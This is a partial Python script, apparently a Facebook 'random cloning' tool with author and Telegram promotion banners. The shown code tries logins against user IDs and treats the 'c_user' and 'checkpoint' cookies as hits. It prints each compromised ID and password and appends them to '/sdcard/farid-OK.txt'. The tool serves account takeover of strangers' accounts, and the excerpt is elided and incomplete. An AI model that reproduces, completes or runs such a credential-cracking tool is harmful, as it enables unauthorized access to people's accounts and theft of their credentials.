https://t.me/SofizakiaryanandFariedtechnical#-----------RAYEES----[IMPORT]---------------------#
...
import zlib
import base64
os.system('espeak -a 300 "WELCOME TO RAYEE FARID RANDOM CLONING TOOLS"')
...
logo = ("""   
  ...
  https://t.me/SofizakiaryanandFariedtechnical                                                                                                                                                ########    ###    ########  #### ########  
##         ## ##   ##     ##  ##  ##     ## 
##        ##   ##  ##     ##  ##  ##     ## 
######   ##     ## ########   ##  ##     ## 
##       ######### ##   ##    ##  ##     ## 
...
##       ##     ## ##     ## #### ########  
\033[1;90m══════════════════════════════════════════════════════════════════════
\033[1;92m[+] AUTHOR    :  RAYEES farid
\033[1;92m[+] GITHUB    :  KINKfarid512
\033[1;92m[+] FACEBOOK  :  RAYEES farid
\033[1;92m[+] WHATSAPP  :  +937********0
\033[1;92m[+] TELEGRAM  :  https://t.me/KINKfarid512
\033[1;92m[+] TOOLS     :  Trial
\033[1;92m[+] VERSION   :  0.1
\033[1;90m══════════════════════════════════════════════════════════════════════""")

clear()
os.system("xdg-open https:/t.me/https://t.me/SofizakiaryanandFariedtechnical")
xxxx = str(len(ugen))
...
def main():
    ...
    print(f"\033[1;97m[2]\033[1;92m JOIN TO https://t.me/SofizakiaryanandFariedtechnicalTELEGRAM")
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mfarid-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n ')
                cek_apk(session,coki)
                open('/sdcard/farid-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mfarid-Cp\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[farid] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
